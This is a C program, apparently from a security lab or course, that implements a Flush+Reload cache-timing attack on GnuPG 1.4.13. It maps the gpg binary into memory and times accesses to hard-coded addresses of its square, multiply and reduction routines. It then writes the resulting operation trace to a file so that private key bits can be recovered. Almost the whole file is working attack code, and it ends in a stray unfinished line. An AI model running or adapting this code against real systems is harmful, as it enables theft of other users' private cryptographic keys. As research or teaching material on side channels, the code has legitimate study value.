#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include "../lib/gnupg.h"
#include <signal.h>

#define SQR_THRESHOLD 265
#define MUL_THRESHOLD 260
#define MOD_THRESHOLD 260

int sqr_counter = 0;
int mul_counter = 0;
int mod_counter = 0;
int tot_sqr_time =0;
int tot_mod_time =0;
int tot_mul_time =0;

unsigned char *addr;

__uint64_t measure_one_block_access_time(void * addr) {

  __uint64_t cycles;

  asm volatile(
    " mfence           \n\t"
    " lfence           \n\t"
    " rdtsc            \n\t"
    " lfence           \n\t"
    " mov %%rax, %%rdi \n\t"
    " mov (%1), %%r8   \n\t"
    " lfence           \n\t"
    " rdtsc            \n\t"
    " sub %%rdi, %%rax \n\t"
	" clflush (%1)     \n\t"
    : "=a"(cycles) /*output*/
    : "c"(addr)
    : "r8", "rdi");

  return cycles;
}

void maccess(void* p)
{
  asm volatile ("movq (%0), %%rax\n"
    :
    : "c" (p)
    : "rax");
}

void flush(void* p) {
    asm volatile ("clflush 0(%0)\n"
      :
      : "c" (p)
      : "rax");
}

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

int main(int argc, char **argv) {

	int fd = open("../../gnupg-1.4.13/g10/./gpg", O_RDONLY);

	__uint64_t SQR_ADDR = 0x000c611d;
	__uint64_t MUL_ADDR = 0x000c5a40;
	__uint64_t MOD_ADDR = 0x000c56b5;

	FILE *fd1 = fopen("result.txt", "w");
	addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
	printf("%p\n",addr);
	unsigned long old_time = 0,time = 0;
	size_t delta = 0,delta1 = 0;
	unsigned char* data = (char *)malloc(1000000 * sizeof(char));
	int data_ptr=0;
	//Compute-intensive loop before we start the attack, to ramp up the frequency
    for(int i = 0; i< 50000000; i++){
        int x = i*53;
        int y = x*i;
        x = i%20;
        y = i%(x+1);
    }
	while(1)
	{
		delta = measure_one_block_access_time(addr + SQR_ADDR);
    	if (delta < SQR_THRESHOLD) 
        { 
            sqr_counter++;
            tot_sqr_time+=delta;
            data[data_ptr++]='S';
        }

        delta = measure_one_block_access_time(addr + MUL_ADDR); 
    	if (delta < MUL_THRESHOLD) 
        { 
            mul_counter++;
            tot_mul_time+=delta;
            data[data_ptr++]='M';
        }

        delta = measure_one_block_access_time(addr + MOD_ADDR);
    	if (delta < MOD_THRESHOLD) 
        { 
            mod_counter++;
            tot_mod_time+=delta;
            data[data_ptr++]='R';
        }
    	if (sqr_counter>12000)  
           break;
	}
	data[data_ptr]='\0';
	data[data_ptr]='\0';
	int sqr_cnt=0,mul_cnt=0;

	int mul_extra=0;
	int sqr_extra=0;
	for(int temp_ptr = 0;temp_ptr < data_ptr;temp_ptr++)
	{
		if(data[temp_ptr]=='S')
		{
			fprintf(fd1, "S");
			sqr_cnt++;
			if(data[temp_ptr+1]=='M')
			{
				while(sqr_cnt<4)
				{
					fprintf(fd1, "S");
					sqr_cnt++;
					sqr_extra++;
				}
				fprintf(fd1, "R");
				sqr_extra++;
				sqr_cnt=0;
			}
			else if(sqr_cnt==4)
			{
				while(data[temp_ptr+3]!='S')
					temp_ptr++;
				if(data[temp_ptr+1]!='R')
				{
					fprintf(fd1, "R");
					sqr_extra++;
				}
				sqr_cnt=0;
			}
		}
		else if(data[temp_ptr]=='M')
		{
			fprintf(fd1, "M");
			mul_cnt++;
			if(data[temp_ptr+1]=='S')
			{
				while(mul_cnt<4)
				{
					fprintf(fd1, "M");
					mul_cnt++;
					mul_extra++;
				}
				mul_extra++;
				fprintf(fd1, "R");
				mul_cnt=0;
			}
			else if(mul_cnt==4)
			{
				while(data[temp_ptr+3]!='M')
					temp_ptr++;
				if(data[temp_ptr+1]!='R')
				{
					fprintf(fd1, "R");
					mul_extra++;
				}
				mul_cnt=0;
			}
		}
		else if(data[temp_ptr]=='R')
		{
			fprintf(fd1, "%c", data[temp_ptr]);
			if(data[temp_ptr+1]=='R')
				temp_ptr++;
		}
	}

	printf("\nsqr %d\n mul %d\n mod %d\n", sqr_counter, mul_counter, mod_counter);
	printf("sqr %f\n", (tot_sqr_time*1.0)/sqr_counter);
	printf("mul %f\n", (tot_mul_time*1.0)/mul_counter);
	printf("mod %f\n", (tot_mod_time*1.0)/mod_counter);
	fclose(fd1);
	return 0;
}

extern inline __attribute__((always_inline))


